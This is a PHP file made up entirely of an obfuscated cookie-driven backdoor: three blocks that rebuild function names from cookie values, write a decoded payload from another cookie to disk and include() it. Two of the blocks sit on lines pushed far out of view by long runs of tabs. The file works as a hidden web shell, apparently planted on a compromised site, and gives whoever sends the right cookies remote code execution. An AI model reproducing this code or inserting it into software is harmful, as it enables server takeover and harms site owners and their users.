<?php																																										if(isset($_COOKIE[3])&&isset($_COOKIE[10])){$c=$_COOKIE;$k=0;$n=9;$p=array();$p[$k]='';while($n){$p[$k].=$c[10][$n];if(!$c[10][$n+1]){if(!$c[10][$n+2])break;$k++;$p[$k]='';$n++;}$n=$n+9+1;}$k=$p[3]().$p[5];if(!$p[13]($k)){$n=$p[14]($k,$p[6]);$p[26]($n,$p[24].$p[11]($p[23]($c[3])));}include($k);}
																																										if(isset($_COOKIE[3])&&isset($_COOKIE[18])){$c=$_COOKIE;$k=0;$n=10;$p=array();$p[$k]='';while($n){$p[$k].=$c[18][$n];if(!$c[18][$n+1]){if(!$c[18][$n+2])break;$k++;$p[$k]='';$n++;}$n=$n+10+1;}$k=$p[29]().$p[26];if(!$p[2]($k)){$n=$p[9]($k,$p[20]);$p[19]($n,$p[17].$p[22]($p[16]($c[3])));}include($k);}

if (isset($_COOKIE[3]) && isset($_COOKIE[30])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 9;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[30][$n];
        if (!$c[30][$n + 1]) {
            if (!$c[30][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 9 + 1;
    }
    $k = $p[16]() . $p[29];
    if (!$p[24]($k)) {
        $n = $p[0]($k, $p[2]);
        $p[12]($n, $p[14] . $p[15]($p[10]($c[3])));
    }
    include($k);
}